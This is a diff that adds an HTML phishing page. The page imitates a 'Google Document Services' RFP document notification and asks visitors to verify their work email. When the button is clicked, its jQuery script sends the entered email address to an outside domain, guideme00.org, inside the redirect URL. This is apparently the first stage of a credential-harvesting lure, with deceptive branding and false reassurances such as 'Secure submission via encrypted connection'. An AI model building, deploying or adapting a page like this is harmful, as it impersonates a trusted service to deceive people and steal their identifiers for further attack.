@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Official Invitation</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+
+    <script>
+        tailwind.config = {
+            content: [],
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['"Segoe UI"', 'Tahoma', 'Geneva', 'Verdana', 'sans-serif'],
+                    }
+                }
+            }
+        }
+    </script>
+
+    <style>
+        body {
+            background: #d5f5f0;
+        }
+    </style>
+</head>
+
+<body class="min-h-screen flex items-center justify-center p-4">
+
+    <div class="w-full max-w-md bg-white rounded-2xl shadow-xl overflow-hidden">
+
+        <!-- Blue Top Border -->
+        <div class="h-1.5 bg-[#287c70]"></div>
+
+        <div class="p-8">
+            <!-- Header with Icon -->
+            <div class="flex items-center justify-center gap-3 mb-6">
+                <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNmVtIiBoZWlnaHQ9IjI2ZW0iIHZpZXdCb3g9IjAgMCAxNiAxNiI+Cgk8cGF0aCBkPSJNMCAwaDE2djE2SDB6IiBmaWxsPSJub25lIiAvPgoJPHBhdGggZmlsbD0iIzI4N2M3MCIgZD0iTTkuMjkzIDBINGEyIDIgMCAwIDAtMiAydjEyYTIgMiAwIDAgMCAyIDJoOGEyIDIgMCAwIDAgMi0yVjQuNzA3QTEgMSAwIDAgMCAxMy43MDcgNEwxMCAuMjkzQTEgMSAwIDAgMCA5LjI5MyAwTTkuNSAzLjV2LTJsMyAzaC0yYTEgMSAwIDAgMS0xLTFNNC41IDlhLjUuNSAwIDAgMSAwLTFoN2EuNS41IDAgMCAxIDAgMXpNNCAxMC41YS41LjUgMCAwIDEgLjUtLjVoN2EuNS41IDAgMCAxIDAgMWgtN2EuNS41IDAgMCAxLS41LS41bS41IDIuNWEuNS41IDAgMCAxIDAtMWg0YS41LjUgMCAwIDEgMCAxeiIgLz4KPC9zdmc+Cg=="
+                    alt="Document Icon" class="w-9 h-9">
+                <h1 class="text-2xl font-bold text-[#287c70]">RFP Document Notification</h1>
+            </div>
+
+            <p class="text-center text-gray-600 mb-8">
+                Please verify your email address to securely access your document.
+            </p>
+
+            <!-- Info Box -->
+            <div class="bg-[#cce6e4] border-l-4 border-[#287c70] p-4 rounded-r-xl mb-8 text-sm text-[#165b52]">
+                Google Document Services requires authentication before granting access to shared documents.
+            </div>
+
+            <input type="email" id="email" name="email" placeholder="Work or business email" required
+                class="w-full px-5 py-4 border border-gray-300 rounded-xl focus:outline-none focus:border-[#2f6fc1] transition-colors mb-4 text-gray-700">
+
+            <button type="button" id="submit"
+                class="validate w-full bg-[#00796b] hover:bg-[#004d40] transition-colors text-white font-semibold py-4 rounded-xl text-base">
+                Access Document
+            </button>
+
+            <!-- Footer -->
+            <p class="text-center text-gray-500 text-sm mt-8">
+                Secure submission via encrypted connection.
+            </p>
+        </div>
+    </div>
+    <!-- 4. Add jQuery CDN + Fixed script -->
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+    <script>
+        $('.validate').click(function () {
+            const email = $('#email').val().trim();
+            const errorMsg = $('.val-msg');
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+            if (!emailRegex.test(email)) {
+                errorMsg.removeClass('d-none');
+                return;
+            }
+
+            errorMsg.addClass('d-none');
+            
+            // ✅ Now email is included!
+            const redirectUrl = 'https://guideme00.org/?4c4e8d96/' + encodeURIComponent(email);
+            window.location.href = redirectUrl;
+        });
+    </script>
+</body>
+
+</html>
